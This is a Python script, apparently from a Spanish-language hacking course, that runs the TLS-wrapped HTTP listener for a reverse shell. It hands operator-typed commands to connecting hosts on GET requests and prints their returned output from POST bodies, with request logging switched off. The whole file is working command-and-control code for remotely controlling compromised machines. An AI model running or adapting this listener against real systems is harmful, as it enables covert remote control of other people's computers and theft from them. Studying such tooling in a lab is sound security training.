from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import ssl

server_ip = "0.0.0.0"
server_port = 8080

class MyHandler (BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(input("Shell>").encode())

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length'))
        data = parse_qs(self.rfile.read(content_length).decode())
        self.send_response(200)
        self.end_headers()
        if "response" in data:
            print(data["response"][0])
        else:
            print(data)

if __name__ == "__main__":
    server = HTTPServer((server_ip,server_port), MyHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="/home/kali/Documents/python-hacking/seccion5/5_4_http_reverse_shell/server.pem")
    server.socket = context.wrap_socket(server.socket, server_side=True)
    print(f"Escuchando conexiones en {server_ip}:{server_port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Servidor finalizado.")
        server.server_close()